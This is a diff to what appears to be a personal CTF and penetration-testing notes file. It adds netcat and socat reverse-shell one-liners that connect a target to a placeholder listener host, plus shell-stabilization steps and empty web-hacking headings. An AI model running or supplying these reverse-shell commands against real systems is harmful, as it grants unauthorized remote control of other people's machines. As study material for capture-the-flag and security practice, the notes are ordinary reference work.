@@ -89,6 +89,77 @@ Where the match criteria is used in order to print only some matching Responses:
 
 But you can also exploit the registration form where the "Username already exist" response will be provided.
 
+# Gaining Access
+
+## Getting a reverse shell
+
+1. **Netcat**: easy to istantiate but also to lose, requires stabilization:
+
+      ```bash
+      On target ---
+      $ nc [listener ip] [listener port] -e /bin/bash
+      $ mkfifo /tmp/f; nc [listener ip] [listener port] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+      
+      On listener ---
+      $ nc -nlvp [listener port]
+      ```
+
+2. **Socat**: stronger but harder syntax, rarely installed, provides stabilized shell (Socat binary available [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true))
+
+      ```bash
+      On target ---
+      $ socat TCP:[listener ip]:[listener port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+      
+      On listener ---
+      $ socat TCP-L:[port] FILE:`tty`,raw,echo=0
+      ```
+      
+3. **Metasploit**: sometimes banned from CTF environments
+
+All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+## Shell Stabilization
+
+### Python
+
+1. Check Python version and execute the command
+  
+    python -c 'import pty;pty.spawn("/bin/bash")'
+    
+2.
+
+    export TERM=xterm
+    
+3. Cntrl + Z
+
+       stty raw -echo; fg 
+
+### rlwrap
+
+1. Use rlwrap prepended nc command at the listener
+
+       rlwrap nc -nlvp [port]
+
+2. Cntrl + Z
+
+       stty raw -echo; fg
+
+## Web Hacking
+
+### Authenitcation Bypass
+
+### IDOR
+
+### LFI & RFI
+
+### SSRF
+
+### XSS
+
+### Command Injection
+
+### SQL Injection
+
 ## Post-Access
 
 ### Device enumeration
